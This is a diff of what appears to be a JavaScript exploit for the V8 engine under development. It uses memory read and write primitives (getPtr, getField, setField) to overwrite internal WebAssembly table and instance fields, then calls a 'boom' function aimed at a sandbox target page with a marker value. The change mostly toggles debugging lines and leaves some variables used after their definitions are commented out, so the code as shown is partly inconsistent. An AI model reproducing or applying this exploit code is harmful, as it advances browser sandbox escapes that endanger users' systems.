@@ -75,28 +75,21 @@ let uses_t0 = getField(t0, 0x18);
 let uses_t1 = getField(t1, 0x18);
 setField(t0, 0x18, uses_t1); // table uses
 
-let instance0_ptr = getPtr(instance0);
-let module_object0 = getField(instance0_ptr, 0x10);
+// let instance0_ptr = getPtr(instance0);
+// let module_object0 = getField(instance0_ptr, 0x10);
 
-let instance1_ptr = getPtr(instance1);
-let module_object1 = getField(instance1_ptr, 0x10);
+// let instance1_ptr = getPtr(instance1);
+// let module_object1 = getField(instance1_ptr, 0x10);
 
 setField(instance1_ptr, 0x10, module_object0);
 
-// let instance0_ptr = getPtr(instance0);
-// let instance1_ptr = getPtr(instance1);
-// let trusted_data0_index = getField(instance0_ptr, 0xc);
-// let trusted_data1_index = getField(instance1_ptr, 0xc);
-// setField(instance0_ptr, 0xc, trusted_data1_index);
-
-
-// %DebugPrint(table0);
+%DebugPrint(table0);
 // %DebugPrint(table1);
-// %SystemBreak();
+%SystemBreak();
 
 
 
-table0.grow(2, func0);
+// table0.grow(2, func0);
 
 boom(BigInt(Sandbox.targetPage) - 0x7n, 0xdeadbeefcafebaben);
 // console.log(boom(1n, 2n));
